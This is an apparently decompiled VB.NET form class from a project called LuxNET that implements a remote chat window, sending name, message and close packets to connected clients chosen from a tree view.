Imports LuxNET.My
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports LuxNET.LuxNET

Public Class RemoteChat
    Public Sub New()
        Me.packer = New LuxNET.Pack
        Me.clients = New ArrayList
        Me.curtext = New String((My.Forms.FormMain.LV_Clients.Items.Count + 1) - 1) {}
        Me.index = 0
        Me.InitializeComponent()
    End Sub

    Private Sub RemoteChat_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Dim num2 As Integer = (Me.clients.Count - 1)
        Dim i As Integer = 0
        Do While (i <= num2)
            Me.currentclient = DirectCast(Me.clients.Item(i), ServerClient)
            Me.SendPacket(New Object() {CByte(&H42)})
            i += 1
        Loop
    End Sub

    Private Sub RemoteChat_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.nam = Interaction.InputBox("Please enter your name!", "Name", "", -1, -1)
        If ((Me.nam Is Nothing) OrElse (Me.nam.Length = 0)) Then
            Me.Close()
        End If
        If (Me.clients.Count = 1) Then
            Me.currentclient = DirectCast(Me.clients.Item(0), ServerClient)
            Me.SendPacket(New Object() {CByte(&H40), Me.nam})
            Me.Text = ("Remote Chat - " & Me.TV_ConnectedClients.Nodes.Item(0).Text)
        End If
    End Sub

    Private Sub RichTextBox1_TextChanged(sender As Object, e As EventArgs) Handles RichTextBox1.TextChanged
        Me.curtext(Me.index) = Me.RichTextBox1.Text
    End Sub
    Private Sub SendPacket(ByVal ParamArray args As Object())
        Dim data As Byte() = Me.packer.Serialize(args)
        Me.currentclient.Send(data)
    End Sub

    Private Sub TextBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles TextBox1.KeyDown
        Try
            If (((Not Me.TextBox1.Text Is Nothing) AndAlso (Me.TextBox1.TextLength <> 0)) AndAlso (e.KeyCode = Keys.Enter)) Then
                Me.SendPacket(New Object() {CByte(&H41), Me.nam, Me.TextBox1.Text})
                If (Me.RichTextBox1.TextLength = 0) Then
                    Me.RichTextBox1.AppendText(("You:" & ChrW(13) & ChrW(10) & Me.TextBox1.Text))
                    Me.RichTextBox1.ScrollToCaret()
                    Me.TextBox1.Clear()
                Else
                    Me.RichTextBox1.AppendText((ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10) & "You:" & ChrW(13) & ChrW(10) & Me.TextBox1.Text))
                    Me.RichTextBox1.ScrollToCaret()
                    Me.TextBox1.Clear()
                End If
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub TV_ConnectedClients_AfterSelect(sender As Object, e As TreeViewEventArgs) Handles TV_ConnectedClients.AfterSelect
        Try
            Me.index = Me.TV_ConnectedClients.SelectedNode.Index
            Me.RichTextBox1.Text = Me.curtext(Me.index)
            Me.RichTextBox1.ForeColor = Color.Black
            Me.currentclient = DirectCast(Me.clients.Item(Me.index), ServerClient)
            Me.SendPacket(New Object() {CByte(&H40), Me.nam})
            Me.Text = ("Remote Chat - " & Me.TV_ConnectedClients.SelectedNode.Text)
            Me.TV_ConnectedClients.SelectedNode.ImageIndex = 0
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private currentclient As ServerClient
    Public curtext As String()
    Public index As Integer
    Private nam As String
    Private packer As LuxNET.Pack
    Public clients As ArrayList

    ' Nested Types
    Public Enum PacketHeaders As Byte
        ' Fields
        CloseRemoteChat = &H42
        InitializeRemoteChat = &H40
        RemoteChatMessage = &H41
    End Enum
End Class